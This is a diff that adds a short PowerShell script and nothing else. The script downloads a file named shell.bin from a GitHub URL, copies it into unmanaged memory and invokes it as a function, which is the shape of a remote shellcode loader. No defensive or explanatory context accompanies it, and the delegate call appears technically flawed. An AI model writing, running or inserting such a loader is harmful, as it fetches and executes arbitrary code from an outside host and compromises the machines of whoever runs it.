@@ -1,0 +1,5 @@
+$sc = (New-Object Net.WebClient).DownloadData("https://github.com/HexagonFetish/hello/raw/refs/heads/main/shell.bin")
+$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $sc.Length)
+$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, (New-Object System.Func[Int32]))
+$func.Invoke(0)
